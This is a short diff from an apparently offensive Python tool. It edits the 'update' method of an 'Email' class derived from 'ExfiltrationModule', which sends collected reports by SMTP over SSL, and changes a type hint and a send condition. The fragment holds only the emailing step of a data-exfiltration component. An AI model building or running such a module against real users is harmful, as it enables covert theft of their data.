@@ -56,10 +56,10 @@ class Email(ExfiltrationModule):
         message.attach(part)
         return message.as_string()
 
-    def update(self, message: [str, Path]) -> None:
+    def update(self, message: [str, Path, None]) -> None:
         """Send each report as an email with or without an attachment
         through a secure connection using SMTP."""
-        if self.module.has_data is True:
+        if message is not None:
             with smtplib.SMTP_SSL(
                     host=self.smtp_host,
                     port=self.smtp_port,
